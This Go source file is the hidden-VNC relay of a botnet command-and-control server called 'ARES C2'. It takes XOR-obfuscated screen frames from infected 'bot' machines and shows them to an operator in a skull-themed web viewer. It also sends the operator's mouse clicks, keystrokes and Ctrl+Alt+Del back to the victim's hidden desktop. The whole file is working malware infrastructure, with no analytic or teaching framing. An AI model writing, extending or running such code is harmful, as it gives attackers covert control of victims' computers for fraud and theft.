/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 — hVNC Stream Handler + Web Viewer
 *
 *  Receives pixel frames from bot hVNC module,
 *  relays to operator via WebSocket for real-time viewing.
 *
 *  Architecture:
 *    Bot → TCP:9091 → StreamHandler → WebSocket → HTML5 Canvas
 * ═══════════════════════════════════════════════════════════════
 */

package relay

import (
	"crypto/subtle"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// HVNCManager manages hVNC streams from bots
type HVNCManager struct {
	sessions map[string]*HVNCSession
	mu       sync.RWMutex
	listener net.Listener
	running  atomic.Bool
}

// HVNCSession represents one active hVNC stream
type HVNCSession struct {
	BotID       string
	Width       int
	Height      int
	BotConn     net.Conn
	Viewers     []*HVNCViewer
	LastFrame   []byte
	mu          sync.RWMutex
	Active      bool
	StreamKey   byte // v3.3: XOR key for input command encryption
}

// HVNCViewer is an operator watching the hVNC stream
type HVNCViewer struct {
	conn   net.Conn
	writer http.ResponseWriter
	flush  http.Flusher
	done   chan struct{}
}

func NewHVNCManager() *HVNCManager {
	return &HVNCManager{
		sessions: make(map[string]*HVNCSession),
	}
}

// StartStreamListener listens for bot hVNC connections on :9091
func (m *HVNCManager) StartStreamListener(port int) error {
	var err error
	m.listener, err = net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
	if err != nil {
		return err
	}

	m.running.Store(true)
	log.Printf("[hVNC] Stream listener on 127.0.0.1:%d", port)

	go func() {
		for m.running.Load() {
			conn, err := m.listener.Accept()
			if err != nil {
				continue
			}
			go m.handleBotStream(conn)
		}
	}()

	return nil
}

func (m *HVNCManager) Stop() {
	m.running.Store(false)
	if m.listener != nil {
		m.listener.Close()
	}
}

func (m *HVNCManager) handleBotStream(conn net.Conn) {
	// Read handshake — v3.3 sends XOR'd "S|bot_id|w|h|key\n"
	buf := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, err := conn.Read(buf)
	conn.SetReadDeadline(time.Time{})

	if err != nil || n == 0 {
		conn.Close()
		return
	}

	raw := make([]byte, n)
	copy(raw, buf[:n])

	var botID string
	var width, height int = 1920, 1080
	var streamKey byte

	// v3.3: Try XOR brute-force decode — agent XOR's "S|..." with stream_key
	decoded := false
	for key := byte(1); key != 0; key++ {
		trial := make([]byte, n)
		for i := 0; i < n; i++ {
			trial[i] = raw[i] ^ key
		}
		line := strings.TrimRight(string(trial), "\r\n ")
		if strings.HasPrefix(line, "S|") {
			parts := strings.Split(line, "|")
			if len(parts) >= 5 {
				botID = parts[1]
				fmt.Sscanf(parts[2], "%d", &width)
				fmt.Sscanf(parts[3], "%d", &height)
				fmt.Sscanf(parts[4], "%x", &streamKey)
				decoded = true
				break
			}
		}
	}

	// Fallback: legacy plaintext "HVNC|bot_id|width|height"
	if !decoded {
		line := strings.TrimRight(string(buf[:n]), "\r\n ")
		parts := strings.Split(line, "|")
		if len(parts) >= 4 && parts[0] == "HVNC" {
			botID = parts[1]
			fmt.Sscanf(parts[2], "%d", &width)
			fmt.Sscanf(parts[3], "%d", &height)
		} else if len(parts) >= 3 && parts[0] == "HVNC" {
			botID = conn.RemoteAddr().String()
			fmt.Sscanf(parts[1], "%d", &width)
			fmt.Sscanf(parts[2], "%d", &height)
		} else {
			conn.Close()
			return
		}
	}

	// v5.0 FIX H-16: Validate botID format before accepting stream
	validBot := len(botID) >= 8 && len(botID) <= 64
	if validBot {
		for _, c := range botID {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				validBot = false
				break
			}
		}
	}
	if !validBot {
		log.Printf("[hVNC] Rejected: invalid botID from %s", conn.RemoteAddr())
		conn.Close()
		return
	}

	// v5.0 FIX H-18: Warn about unencrypted stream (XOR key=0)
	if streamKey == 0 {
		log.Printf("[hVNC] ⚠ WARNING: Unencrypted stream from bot %s — upgrade agent", botID)
	}

	session := &HVNCSession{
		BotID:     botID,
		Width:     width,
		Height:    height,
		BotConn:   conn,
		Active:    true,
		StreamKey: streamKey,
	}

	m.mu.Lock()
	// Close existing session for this bot
	if old, ok := m.sessions[botID]; ok {
		old.Active = false
		old.BotConn.Close()
	}
	m.sessions[botID] = session
	m.mu.Unlock()

	// Send ACK
	conn.Write([]byte("ACK\n"))

	log.Printf("[hVNC] Bot stream: %s (%dx%d) key=0x%02X", botID, width, height, streamKey)

	// v3.3: Read binary XOR'd frames
	// Frame format: [0xF0:1][width:2BE][height:2BE][frameLen:4BE] all XOR'd with streamKey
	hdrBuf := make([]byte, 9)
	frameBuf := make([]byte, width*height*3+4096)
	for m.running.Load() && session.Active {
		// Read 9-byte frame header
		if _, err := io.ReadFull(conn, hdrBuf); err != nil {
			break
		}
		// XOR-decode header
		if streamKey != 0 {
			for i := range hdrBuf {
				hdrBuf[i] ^= streamKey
			}
		}
		if hdrBuf[0] != 0xF0 {
			break // invalid frame marker
		}
		frameLen := int(hdrBuf[5])<<24 | int(hdrBuf[6])<<16 | int(hdrBuf[7])<<8 | int(hdrBuf[8])
		if frameLen <= 0 || frameLen > len(frameBuf) {
			break
		}
		// Read exact frame payload
		if _, err := io.ReadFull(conn, frameBuf[:frameLen]); err != nil {
			break
		}
		// XOR-decode frame data
		if streamKey != 0 {
			for i := 0; i < frameLen; i++ {
				frameBuf[i] ^= streamKey
			}
		}

		data := frameBuf[:frameLen]

		// Store last frame
		session.mu.Lock()
		session.LastFrame = make([]byte, frameLen)
		copy(session.LastFrame, data)

		// Relay to all viewers
		for _, viewer := range session.Viewers {
			select {
			case <-viewer.done:
				continue
			default:
				// Base64 encode for SSE
				encoded := base64.StdEncoding.EncodeToString(data)
				fmt.Fprintf(viewer.writer, "data: %s\n\n", encoded)
				if viewer.flush != nil {
					viewer.flush.Flush()
				}
			}
		}
		session.mu.Unlock()
	}

	session.Active = false
	conn.Close()

	m.mu.Lock()
	delete(m.sessions, botID)
	m.mu.Unlock()

	log.Printf("[hVNC] Bot stream closed: %s", botID)
}

// SendInput sends keyboard/mouse input to bot
func (m *HVNCManager) SendInput(botID string, inputType string, params ...int) error {
	m.mu.RLock()
	session := m.sessions[botID]
	m.mu.RUnlock()

	if session == nil || !session.Active {
		return fmt.Errorf("no active session for %s", botID)
	}

	var cmd string
	switch inputType {
	case "mouse":
		if len(params) >= 3 {
			cmd = fmt.Sprintf("MOUSE|%d|%d|%d\n", params[0], params[1], params[2])
		}
	case "key":
		if len(params) >= 2 {
			cmd = fmt.Sprintf("KEY|%d|%d\n", params[0], params[1])
		}
	}

	if cmd != "" {
		// v3.3: XOR-encode input to match agent-side decode
		buf := []byte(cmd)
		if session.StreamKey != 0 {
			for i := range buf {
				buf[i] ^= session.StreamKey
			}
		}
		_, err := session.BotConn.Write(buf)
		return err
	}
	return fmt.Errorf("invalid input")
}

// GetSessions returns list of active hVNC sessions
func (m *HVNCManager) GetSessions() []map[string]interface{} {
	m.mu.RLock()
	defer m.mu.RUnlock()

	list := make([]map[string]interface{}, 0)
	for _, s := range m.sessions {
		list = append(list, map[string]interface{}{
			"bot_id": s.BotID,
			"width":  s.Width,
			"height": s.Height,
			"active": s.Active,
		})
	}
	return list
}

// RegisterHTTPHandlers adds hVNC routes to the HTTP mux (with auth)
func (m *HVNCManager) RegisterHTTPHandlers(mux *http.ServeMux, authToken string) {
	// Auth helper
	checkAuth := func(w http.ResponseWriter, r *http.Request) bool {
		token := r.Header.Get("Authorization")
		token = strings.TrimPrefix(token, "Bearer ")
		if token == "" || subtle.ConstantTimeCompare([]byte(token), []byte(authToken)) != 1 {
			http.Error(w, "unauthorized", 401)
			return false
		}
		return true
	}
	// SSE stream for viewer
	mux.HandleFunc("GET /hvnc/stream/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		botID := strings.TrimPrefix(r.URL.Path, "/hvnc/stream/")

		m.mu.RLock()
		session := m.sessions[botID]
		m.mu.RUnlock()

		if session == nil {
			http.Error(w, "no session", 404)
			return
		}

		flusher, ok := w.(http.Flusher)
		if !ok {
			http.Error(w, "streaming not supported", 500)
			return
		}

		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.Header().Set("Connection", "keep-alive")

		viewer := &HVNCViewer{
			writer: w,
			flush:  flusher,
			done:   make(chan struct{}),
		}

		session.mu.Lock()
		session.Viewers = append(session.Viewers, viewer)
		session.mu.Unlock()

		// Block until client disconnects
		<-r.Context().Done()
		close(viewer.done)
	})

	// Input relay
	mux.HandleFunc("POST /hvnc/input/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		botID := strings.TrimPrefix(r.URL.Path, "/hvnc/input/")

		buf := make([]byte, 256)
		n, _ := r.Body.Read(buf)
		if n == 0 {
			http.Error(w, "no data", 400)
			return
		}

		parts := strings.Split(string(buf[:n]), "|")
		if len(parts) < 2 {
			http.Error(w, "invalid", 400)
			return
		}

		inputType := parts[0]
		params := make([]int, 0)
		for _, p := range parts[1:] {
			var v int
			fmt.Sscanf(p, "%d", &v)
			params = append(params, v)
		}

		if err := m.SendInput(botID, inputType, params...); err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		w.WriteHeader(200)
	})

	// Session list (proper JSON, not Go %v)
	mux.HandleFunc("GET /hvnc/sessions", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		sessions := m.GetSessions()
		w.Header().Set("Content-Type", "application/json")
		data := map[string]interface{}{"sessions": sessions}
		json.NewEncoder(w).Encode(data)
	})

	// Web viewer
	mux.HandleFunc("GET /hvnc/viewer/", func(w http.ResponseWriter, r *http.Request) {
		if !checkAuth(w, r) { return }
		botID := strings.TrimPrefix(r.URL.Path, "/hvnc/viewer/")
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, hvncViewerHTML, botID, botID, botID)
	})
}

// hvncViewerHTML is the operator's web viewer
var hvncViewerHTML = `<!DOCTYPE html>
<html><head>
<title>☠ ARES hVNC Viewer</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #0a0a0a; color: #00ff41;
    font-family: 'Consolas', monospace;
    overflow: hidden;
}
.toolbar {
    background: #111; padding: 8px 16px;
    border-bottom: 1px solid #1a1a2e;
    display: flex; align-items: center; gap: 16px;
}
.toolbar h2 { color: #e94560; font-size: 14px; }
.toolbar .info { color: #666; font-size: 12px; }
.toolbar .btn {
    background: #e94560; color: white; border: none;
    padding: 4px 12px; cursor: pointer; border-radius: 3px;
    font-size: 12px;
}
.toolbar .btn:hover { background: #ff6b81; }
#viewport {
    position: relative;
    width: 100vw; height: calc(100vh - 40px);
    display: flex; align-items: center; justify-content: center;
    background: #000;
}
#canvas {
    border: 1px solid #1a1a2e;
    cursor: crosshair;
    image-rendering: pixelated;
}
.fps { position: fixed; bottom: 8px; right: 8px; color: #444; font-size: 11px; }
</style>
</head>
<body>
<div class="toolbar">
    <h2>☠ hVNC — %s</h2>
    <span class="info" id="status">Connecting...</span>
    <button class="btn" onclick="sendCtrlAltDel()">Ctrl+Alt+Del</button>
    <button class="btn" onclick="location.reload()">Reconnect</button>
</div>
<div id="viewport">
    <canvas id="canvas" width="1920" height="1080"></canvas>
</div>
<div class="fps" id="fps">0 FPS</div>

<script>
const botID = '%s';
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let frames = 0;

// Extract auth token from URL
const urlParams = new URLSearchParams(window.location.search);
const authToken = urlParams.get('token') || '';
const authHeaders = { 'Authorization': 'Bearer ' + authToken };

// Connect to stream via fetch + ReadableStream (sends token in header, not URL)
async function connectStream() {
    const response = await fetch('/hvnc/stream/' + botID, {
        headers: { 'Authorization': 'Bearer ' + authToken }
    });
    const reader = response.body.getReader();
    const decoder = new TextDecoder();
    while(true) {
        const {value, done} = await reader.read();
        if(done) break;
        const text = decoder.decode(value);
        for(const line of text.split('\n')) {
            if(line.startsWith('data: ')) {
                const data = atob(line.slice(6).trim());
                const bytes = new Uint8Array(data.length);
                for (let i = 0; i < data.length; i++) bytes[i] = data.charCodeAt(i);
                if (bytes.length > 100) {
                    const w = canvas.width;
                    const h = canvas.height;
                    const imgData = ctx.createImageData(w, h);
                    let srcIdx = 1;
                    for (let y = 0; y < h && srcIdx + 3 < bytes.length; y++) {
                        for (let x = 0; x < w && srcIdx + 3 < bytes.length; x++) {
                            const dstIdx = (y * w + x) * 4;
                            imgData.data[dstIdx + 2] = bytes[srcIdx++];
                            imgData.data[dstIdx + 1] = bytes[srcIdx++];
                            imgData.data[dstIdx + 0] = bytes[srcIdx++];
                            imgData.data[dstIdx + 3] = 255;
                        }
                    }
                    ctx.putImageData(imgData, 0, 0);
                    frames++;
                }
                document.getElementById('status').textContent = 'Connected — streaming';
            }
        }
    }
    document.getElementById('status').textContent = 'Disconnected';
}
connectStream();

// FPS counter
setInterval(() => {
    document.getElementById('fps').textContent = frames + ' FPS';
    frames = 0;
}, 1000);

// Mouse events → send to bot
canvas.addEventListener('click', function(e) {
    const rect = canvas.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) / rect.width * canvas.width);
    const y = Math.round((e.clientY - rect.top) / rect.height * canvas.height);
    fetch('/hvnc/input/' + botID, {
        method: 'POST',
        headers: authHeaders,
        body: 'mouse|' + x + '|' + y + '|1'
    });
});

canvas.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    const rect = canvas.getBoundingClientRect();
    const x = Math.round((e.clientX - rect.left) / rect.width * canvas.width);
    const y = Math.round((e.clientY - rect.top) / rect.height * canvas.height);
    fetch('/hvnc/input/' + botID, {
        method: 'POST',
        headers: authHeaders,
        body: 'mouse|' + x + '|' + y + '|2'
    });
});

// Keyboard events → send to bot
document.addEventListener('keydown', function(e) {
    e.preventDefault();
    fetch('/hvnc/input/' + botID, {
        method: 'POST',
        headers: authHeaders,
        body: 'key|' + e.keyCode + '|0'
    });
});

document.addEventListener('keyup', function(e) {
    e.preventDefault();
    fetch('/hvnc/input/' + botID, {
        method: 'POST',
        headers: authHeaders,
        body: 'key|' + e.keyCode + '|1'
    });
});

function sendCtrlAltDel() {
    const u = '/hvnc/input/' + botID;
    const opts = { method: 'POST', headers: authHeaders };
    fetch(u, { ...opts, body: 'key|17|0' }); // Ctrl
    fetch(u, { ...opts, body: 'key|18|0' }); // Alt
    fetch(u, { ...opts, body: 'key|46|0' }); // Del
    setTimeout(() => {
        fetch(u, { ...opts, body: 'key|46|1' });
        fetch(u, { ...opts, body: 'key|18|1' });
        fetch(u, { ...opts, body: 'key|17|1' });
    }, 100);
}
</script>
</body></html>`

// Unused import suppression
var _ = binary.BigEndian
